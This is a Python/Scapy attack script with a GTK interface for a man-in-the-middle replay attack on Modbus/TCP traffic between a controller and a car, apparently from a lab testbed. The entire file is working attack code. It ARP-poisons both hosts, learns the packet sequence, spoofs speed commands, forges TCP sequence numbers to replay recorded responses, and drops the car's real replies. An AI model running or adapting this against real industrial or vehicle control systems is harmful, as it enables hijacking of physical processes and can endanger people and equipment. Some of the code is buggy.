#!/usr/bin/python

import threading
import time
from scapy.all import *
from modbus import *
import os
import socket
import fcntl
import struct
import netifaces

import sys
from gi.repository import GLib, Gtk, GObject

start_time = 0

SF = open('speed.txt','w')
DF = open('distance.txt','w')

print("Starting attacker, interface: %s" % sys.argv[1])

################## INITIAL VARS #######################
ModbusPort=502 #Default modbus port 502
#interface="wlp3s0" #Define the interface normally it is eth0 or eth1, if using wireless it goes as wlanX
carIP = "192.168.2.3" #IP from the car
controlIP = "192.168.2.2" #IP from control
MaxCount=5000 # Maximum sniffing of packets, if this amount of packets is reached the sniffer stops.
AttackRangeMax = 170
AttackRangeMin = 60
#######################################################

######## Constants
FUNC_CODE_PRINT = ["","FUNC_READ_COIL","","","FUNC_READ_SR","FUNC_WRITE_COIL","FUNC_WRITE_SR","",""]
FUNC_READ_COIL = 1
FUNC_WRITE_COIL = 5
FUNC_READ_SR = 4
FUNC_WRITE_SR = 6
COIL_SYSTEM = 0x0000
COIL_CSPEED = 0x0001
COIL_STATUS_CAR = 0x0002
SR_CAR_SPEED = 0x0000
SR_WALL_DISTANCE = 0x0001
######## Constants

##################### CLASSES ########################
class Session(object):
    def __init__(self,attmac,carmac,conmac,socket,carip,conip):
        self.packetCount = 0
        self.attackerMAC = attmac
        self.carMAC = carmac
        self.controlMAC = conmac
        self.socket = socket
        self.controlIP = conip
        self.carIP = carip
        self.distanceAsked = False
        self.directionASked = False
        self.speedSent = 0
        self.goingForward = 0
        self.wallDistance = 0
        self.prevWallDistance = None
        self.startRecording = False
        self.synced = False
        self.lastDirection = None
        self.startime = 0
        self.subtime = 0

    def resetSession(self):
        self.packetCount = 0
        self.distanceAsked = False
        self.directionASked = False
        self.speedSent = 0
        self.goingForward = 0
        self.wallDistance = 0
        self.lastDirection = None
        self.starttime = 0

class LearningVector(object):
    def __init__(self):
        self.forwardSeq = []
        self.backwardSeq = []
        self.distanceThresMax = None
        self.distanceThresMin = None
        self.speedThresMax = None
        self.speedThresMin = None
        self.fullSeq = []

    def setFullSeq(self,direction):
		if not(direction):
			self.fullSeq =  self.backwardSeq  + self.forwardSeq
		else:
			self.fullSeq = self.forwardSeq + self.backwardSeq
class AttackVector(object):
    def __init__(self):
        self.controlling = False
        self.packetCount = 0

class guiValues(object):
    def __init__(self):
        self.status = "IDLE"
        self.speed = None
        self.distance = None
        self.direction = None
        self.spoofedspeed = 25
        self.proccessingtime = None

##################### CLASSES ########################

class DialogInterface(Gtk.Dialog):

    def __init__(self, parent):
        Gtk.Dialog.__init__(self, "Net Interface", parent, 0,
            (Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL,
             Gtk.STOCK_OK, Gtk.ResponseType.OK))

        self.set_default_size(150, 100)
        self.set_border_width(10)
        interfaces = Gtk.ListStore(int, str)
        intarr = netifaces.interfaces()
        self.selectedInterface = None
        i = 0
        for interface in intarr:
            interfaces.append([i,interface])
            i =+ 1
        name_combo = Gtk.ComboBox.new_with_model_and_entry(interfaces)
        name_combo.set_entry_text_column(1)
        name_combo.connect("changed", self.interface_Selected)
        label = Gtk.Label("Please select your network interface")

        box = self.get_content_area()
        box.set_spacing(6)
        box.add(label)
        box.pack_start(name_combo, False, False, 0)
        self.show_all()

    def interface_Selected(self, combo):
        tree_iter = combo.get_active_iter()
        if tree_iter != None:
            model = combo.get_model()
            row_id, name = model[tree_iter][:2]
        self.selectedInterface = row_id, name  

def app_main():
    global guiVars, cs
    win = Gtk.Window(default_height=400, default_width=800, title="MITM Replay Attack")
    win.set_border_width(10)
    win.connect("delete-event", Gtk.main_quit)
    guiVars = guiValues()

    progress = Gtk.ProgressBar(show_text=False)
    maingrid = Gtk.Grid(column_homogeneous=True,column_spacing=0, row_spacing=0)
    win.add(maingrid)
    grid = Gtk.Grid(column_homogeneous=True,column_spacing=1, row_spacing=10)
    maingrid.attach(grid,0,0,100,100)    
    button = Gtk.ToggleButton("Start Attack")
    grid2 = Gtk.Grid()
    maingrid.attach_next_to(grid2,grid,Gtk.PositionType.RIGHT,200,1)
    
    grid.attach(button,0,1,1,1)
    labelT1 = Gtk.Label()
    labelT1.set_markup("<big><b>Intercepted Data</b></big>")
    grid.attach(labelT1,0,2,1,1)
    labelSpeed = Gtk.Label()
    labelSpeed.set_markup("<b>Speed: None</b>")
    grid.attach(labelSpeed,0,3,1,1)
    labelDistance = Gtk.Label()
    labelDistance.set_markup("<b>Distance: None</b>")
    grid.attach(labelDistance,0,4,1,1)
    labelDirection = Gtk.Label()
    labelDirection.set_markup("<b>Direction: None</b>")
    grid.attach(labelDirection,0,5,1,1)
    labelPTime = Gtk.Label()
    labelPTime.set_markup("<b>Processing Time: None</b>")
    grid.attach(labelPTime,0,6,1,1)

    labelSpin = Gtk.Label()
    labelSpin.set_markup("<b>Spoofed Speed:</b>")
    labelSpin.set_sensitive(False)
    grid.attach(labelSpin,0,7,1,1)
    adjustment = Gtk.Adjustment(25, 0, 200, 1, 10, 0)
    fakespeed = Gtk.SpinButton()
    fakespeed.set_adjustment(adjustment)
    fakespeed.set_sensitive(False)
    
    grid.attach(fakespeed,0,8,1,1)
    grid.attach(progress,0,15,2,14)

    label = Gtk.Label()
    label.set_markup("<big><b>Attacker Status</b></big>")
    grid2.attach(label,0,0,1,1)

    statusLabel = Gtk.Label()
    tView = Gtk.TextView()
    #statusLabel.set_markup("<big>" + guiVars.status +"</big>")
    grid2.attach(statusLabel,0,100,1,1)
    tView.set_editable(False)
    tView.set_cursor_visible(False)
    tView.set_wrap_mode(Gtk.WrapMode.WORD)
    tView.set_size_request(400, 400)
    scrolledwindow = Gtk.ScrolledWindow()
    scrolledwindow.set_hexpand(True)
    scrolledwindow.set_vexpand(True)
    grid2.attach(scrolledwindow,0,200,1,1)
    scrolledwindow.add(tView)

    def setSpoofSpeed(spin):
        guiVars.spoofedspeed = fakespeed.get_value_as_int()

    def update_progess():
        if not(guiVars.status == "IDLE"): progress.pulse()
        progress.set_text(str(1))
        statusLabel.set_sensitive(not statusLabel.get_sensitive())
        statusLabel.set_markup("<big>" + guiVars.status +"</big>")
        labelSpeed.set_markup("<b>Speed: " + str(guiVars.speed) + "</b>")
        labelDistance.set_markup("<b>Distance: " + str(guiVars.distance) + "</b>")
        labelDirection.set_markup("<b>Direction: " + str(guiVars.direction) + "</b>")
        labelPTime.set_markup("<b>Processing Time: " + str(guiVars.proccessingtime)[0:5] + " ms </b>")
        return False

    def guiRefresh():
        while True:
            GLib.idle_add(update_progess)
            time.sleep(0.2)

    def attack(button, name):
        threadAtt = threading.Thread(target=attackThread)
        threadAtt.daemon = True
        threadAtt.start()
        return False

    

    def printTV(text):
        GLib.idle_add(printConsole,text)

    def printConsole(text):
        tbuffer = tView.get_buffer()
        tView.scroll_to_mark(tbuffer.get_insert(), 0.0, True, 0.5, 0.5)
        tbuffer.insert_at_cursor(text + "\n")

    def enableAttGui():
        labelSpin.set_sensitive(True)
        fakespeed.set_sensitive(True)

    def buttonAttack(active):
        button.set_sensitive(active)

    ############################MITM FUNCTION DEFINITION
    def attackThread():
        global cs, lv, av, guiVars
        lv = LearningVector()
        av = AttackVector()
        GLib.idle_add(buttonAttack,False)
        guiVars.status = "POISONING"
        poisonARP(2, False)
        #Enable system packet forwarding
        systemForward(True)
        sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketLearning, store=0, count=MaxCount)
        cs.resetSession()
        GLib.idle_add(enableAttGui)
        sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketAttacking, store=0, count=MaxCount)
        print("************[ATTACKING] Attack Finished***************")
        guiVars.status = "CLEANING ARP"
        arpClear()
        guiVars.status = "IDLE"

    def initializeAttack(intrfc):
        global cs, guiVars, interface
        interface = intrfc
        guiVars.status = "INITIALIZING"
        attackerMAC=getHwAddr(interface)
        socket = conf.L2socket(iface=interface)
        carMAC = get_mac(carIP)
        controlMAC = get_mac(controlIP)
        cs = Session(attackerMAC,carMAC,controlMAC,socket,carIP,controlIP)
        guiVars.status = "IDLE"

def get_mac(IP):
    # GLib.idle_add(printConsole,"[Request] Getting MAC Address from: " + IP)
    os.popen('ping -c 1 %s' % IP)
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        mac = rcv.sprintf(r"%Ether.src%")
        # GLib.idle_add(printConsole,"[Done] MAC: " + mac)
        return mac

def getHwAddr(ifname):
    # GLib.idle_add(printConsole,"[Request] Getting MAC Address from: " + ifname)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    # GLib.idle_add(printConsole,"[Done] MAC: " + mac)
    return mac

def classifyPacket(packet):
    global cs, lv, start_time
    pkt_funcCode = packet.funcCode
    pkt_src = packet[IP].src
    guiVars.status = "LEARNING"
    if not (cs.startRecording):
        if (cs.synced):
            print("[LOG_LEARNING] SYNCING")
            if(pkt_src == cs.carIP and pkt_funcCode == FUNC_READ_COIL):
                cs.lastDirection = packet.coilStatus[0]
                cs.startRecording = True
                print("[LOG_LEARNING] SYNCED START RECORDING")
                start_time = time.time()
            return False
        
        elif (pkt_funcCode == FUNC_READ_COIL and pkt_src == cs.carIP and cs.synced == False):
            print("[LOG_LEARNING] WAITING TO REACH LIMIT")
            if(cs.lastDirection is None): cs.lastDirection = packet.coilStatus[0]
            elif(not cs.lastDirection == packet.coilStatus[0]): 
                cs.synced = True;
                print("[LOG_LEARNING******] LIMIT REACHED")
                print("[LOG_LEARNING] START SYNCING")
        return False

    if (pkt_src == cs.carIP):
        if (pkt_funcCode == FUNC_READ_COIL and not cs.lastDirection == packet.coilStatus[0]):
            pkt_value = packet.coilStatus[0] 
            if(pkt_value): 
                lv.distanceThresMax = cs.wallDistance
                #lv.speedThresMax = cs.speedSent
                cs.lastDirection = pkt_value
            else: 
                lv.distanceThresMin = cs.wallDistance
                #lv.speedThresMax = cs.speedSent
                cs.lastDirection = pkt_value
            print("[LOG_LEARNING] Direction Change! New threshold " + str(cs.wallDistance))
        elif (pkt_funcCode == FUNC_READ_SR):
            cs.wallDistance = packet.registerVal[1]

    if(cs.lastDirection == 1): lv.forwardSeq.append(packet)
    else: lv.backwardSeq.append(packet)
    stopsniff = lv.distanceThresMax is not None and lv.distanceThresMin is not None
    readValue(packet)
    if(stopsniff):lv.setFullSeq(cs.lastDirection)
    return stopsniff

def handlePacketLearning(pkt):
    global cs
    cs.starttime = time.time() * 1000
    pkt_src = pkt[IP].src
    if (pkt_src == cs.controlIP):
        dstHA = cs.carMAC
    elif (pkt_src == cs.carIP):
        dstHA = cs.controlMAC
    forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
    cs.packetCount += 1;
    if cs.packetCount%2 == 0:
        poisonARP(1, False)

    if ((not pkt.haslayer(ModbusADU)) and (not pkt.haslayer(ModbusADU_Answer))):
        return False
    return classifyPacket(pkt)

def handlePacketAttacking(pkt):
    global cs, lv, av, FUNC_CODE_PRINT, guiVars, AttackRangeMax, AttackRangeMin
    cs.starttime = time.time() * 1000
    pkt_src = pkt[IP].src
    guiVars.status = "ATTACKING"
    if (pkt_src == cs.controlIP):
        dstHA = cs.carMAC
    elif (pkt_src == cs.carIP):
        dstHA = cs.controlMAC
    cs.packetCount += 1;

    if ((not pkt.haslayer(ModbusADU)) and (not pkt.haslayer(ModbusADU_Answer))):
        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
        if cs.packetCount%2 == 0:
            poisonARP(1, False)
        return False
        
    if not(av.controlling):
        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
        av.packetCount += 1
        pkt_funcCode = pkt.funcCode
        if (pkt_funcCode == FUNC_READ_SR and pkt_src == cs.carIP):
            distance = pkt.registerVal[1]
            if(distance < AttackRangeMax and distance > AttackRangeMin):
                av.controlling = True
                cs.distanceAsked = False
                cs.directionASked = False
                print("========================= **ATTACKER INITIALIZIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
        if cs.packetCount%2 == 0:
            poisonARP(1, False)
        return False

    try:
        pkt_funcCode = pkt.funcCode
    except:
        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
        if cs.packetCount%2 == 0:
            poisonARP(1, False)
        return False
    localcount = av.packetCount + 1
    if(localcount == len(lv.fullSeq) - 1): return True;
    while not (pkt_funcCode == lv.fullSeq[localcount].funcCode and pkt_src == lv.fullSeq[localcount][IP].src):
        #This small loop adjust the sequence of packages so it matches the current conversation between the controller and the car
        if(localcount == len(lv.fullSeq) - 1): return True;
        localcount += 1
    
    print("[ATTACKING] INTERCEPTED TO: " + pkt[IP].dst + " FUNC: " + FUNC_CODE_PRINT[pkt_funcCode] +" FORWARDING TO: " + lv.fullSeq[av.packetCount][IP].dst + " FUNC: " + FUNC_CODE_PRINT[lv.fullSeq[av.packetCount].funcCode])
    if (pkt_src == cs.controlIP):
        if(pkt_funcCode == FUNC_WRITE_SR):
            pkt.registerValue = guiVars.spoofedspeed

        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
        dstHA = cs.controlMAC
        ############################################
        localcount = av.packetCount
        if(localcount == len(lv.fullSeq) - 1): return True;
        while not (lv.fullSeq[localcount][IP].src == cs.carIP and lv.fullSeq[localcount].funcCode == pkt_funcCode):
           #print("Packet from: %s command: %s not matched with src: %s command: %s" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode],lv.fullSeq[localcount][IP].src,FUNC_CODE_PRINT[lv.fullSeq[localcount].funcCode]) )
           localcount += 1
           if(localcount == len(lv.fullSeq) - 1): return True;
        #print("*******************Packet from: %s command: %s MATCHED!!! with src: %s command: %s" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode],lv.fullSeq[localcount][IP].src,FUNC_CODE_PRINT[lv.fullSeq[localcount].funcCode]) )
        pkt = forge(pkt,lv.fullSeq[localcount])
        #############################################
        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
    else:
        # All the car responses are going to be dropped since the connection now has been completely taken by the attacker
        print("Packet from: %s command: %s DROPPED" % (pkt_src,FUNC_CODE_PRINT[pkt_funcCode]) )
    
    if cs.packetCount%2 == 0:
        poisonARP(1, False)
    av.packetCount += 1;



def poisonARP(nb=3, doSleep=False, sleepTime=0.3):
    for i in range(0, nb):
        send(ARP(op="is-at", pdst=carIP, psrc=controlIP, hwdst=cs.carMAC)) 
        send(ARP(op="is-at", pdst=controlIP, psrc=carIP, hwdst=cs.controlMAC))
    if (doSleep):
            time.sleep(sleepTime)

def arpClear():
    global cs
    print("[Request] ARP Cleaning")
    systemForward(True)
    for i in range(0,3):
        send(ARP(op="is-at", pdst=cs.controlIP, psrc=cs.carIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=cs.carMAC), count=2)
        send(ARP(op="is-at", pdst=cs.carIP, psrc=cs.controlIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=cs.controlMAC), count=2)
        time.sleep(1)
    systemForward(False) 
    print("[Done] ARP Cleaning")

def systemForward(bool):
    if(bool):
        print("[Request] Enable system forwarding")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("[Request] Disable system forwarding")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def forwardPacket(packet, socket, dstMAC, srcMAC):
    global cs, guiVars, FUNC_CODE_PRINT
    if (packet.haslayer(Ether)):
        packet[Ether].dst=dstMAC 
        packet[Ether].src=srcMAC 
        if (packet.haslayer(TCP)):
            del packet[IP].chksum 
            del packet[TCP].chksum
            packet = packet.__class__(str(packet))
        if (socket == None):    
            socket = conf.L2socket(iface="eth0")
        socket.send(packet)
        guiVars.proccessingtime = time.time() * 1000 - cs.starttime
        if(guiVars.proccessingtime > 50 and (packet.haslayer(ModbusADU) or packet.haslayer(ModbusADU_Answer))):
            print("Destination = " + packet[IP].src)
            print("Function = " + FUNC_CODE_PRINT[packet.funcCode])
            print("Validate Time = " + str(cs.subtime))
            print("Processing Time = " + str(guiVars.proccessingtime))
            cs.subtime = 0
        return True
    return False    

def readValue(packet):
    global FUNC_READ_COIL, FUNC_WRITE_COIL, FUNC_READ_SR, FUNC_WRITE_SR, cs, guiVars, start_time
    pkt_funcCode = packet.funcCode
    if (pkt_funcCode == FUNC_READ_COIL):
        if(cs.directionASked and packet[IP].src == cs.carIP):
            cs.directionASked = False
            guiVars.direction = "Forward" if packet.coilStatus[0] else "Backward"
            return packet.coilStatus[0]
        elif(packet[IP].src == cs.controlIP):
            cs.directionASked = True
            return -1
    elif (pkt_funcCode == FUNC_READ_SR):
        if(cs.distanceAsked and packet[IP].src == cs.carIP):
            cs.distanceAsked = False
            timestamp = "%s" % (time.time() - start_time)
            DF.write(timestamp + " " + str(packet.registerVal[1]) + "\n")
            guiVars.distance = packet.registerVal[1]
            return packet.registerVal[1]
        elif(packet[IP].src == cs.controlIP):
            cs.distanceAsked = True
            return -1;
    elif (pkt_funcCode == FUNC_WRITE_SR):
        guiVars.speed = packet.registerValue
        if(packet[IP].src == cs.controlIP):
            timestamp = "%s" % (time.time() - start_time)
            SF.write(timestamp + " " + str(packet.registerValue) + "\n")
        return packet.registerValue
    else: return -1

def forge(pkt,replayedPkt):
    replayedPkt[TCP].seq=pkt[TCP].ack
    replayedPkt[TCP].ack=pkt[TCP].seq + len(pkt[TCP].payload)
    replayedPkt[TCP].sport=pkt[TCP].dport #Swith Ports
    replayedPkt[TCP].dport=pkt[TCP].sport #Swith Ports
    ts=('Timestamp',(pkt[TCP].options[2][1][1]+11,pkt[TCP].options[2][1][0])) #Create timestamp tuple structure
    replayedPkt[TCP].options[2]=ts #Insert the tuple in the third position of TCP options
    return replayedPkt

def insertValue(packet,value):
    global FUNC_READ_COIL, FUNC_WRITE_COIL, FUNC_READ_SR, FUNC_WRITE_SR
    pkt_funcCode = packet.funcCode
    if(value is None or value == "" or value == -1):
        return packet
    elif (pkt_funcCode == FUNC_WRITE_SR and packet[IP].src == cs.controlIP):
        packet.registerValue = guiVars.spoofedspeed
    elif (pkt_funcCode == FUNC_READ_SR):
        packet.registerVal[1] = value
    elif (pkt_funcCode == FUNC_READ_COIL):
        packet.coilStatus[0] = value
    return packet



if __name__ == "__main__":
    # Calling GObject.threads_init() is not needed for PyGObject 3.10.2+
    global cs, guiVars, interface, lv, av
    print "#####################################################################################################"
    interface = sys.argv[1]
    guiVars = guiValues()
    print "INITIALIZING"
    attackerMAC=getHwAddr(interface)
    socket = conf.L2socket(iface=interface)
    carMAC = get_mac(carIP)
    controlMAC = get_mac(controlIP)
    cs = Session(attackerMAC,carMAC,controlMAC,socket,carIP,controlIP)
    print("Attacking CONTROLLER ip: %s mac: %s and CAR ip: %s mac: %s" %(cs.controlIP,cs.controlMAC,cs.carIP,cs.carMAC))
    print "IDLE"
    lv = LearningVector()
    av = AttackVector()
    #GLib.idle_add(buttonAttack,False)
    print "POISONING"
    poisonARP(2, False)
    #Enable system packet forwarding
    systemForward(True)
    
    sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketLearning, store=0, count=MaxCount)
    cs.resetSession()
    # GLib.idle_add(enableAttGui)
    sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketAttacking, store=0, count=MaxCount)
    print("========================= **ATTACKER FINALIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
    print "CLEANING ARP"
    arpClear()
    systemForward(False)
    print "DONE!"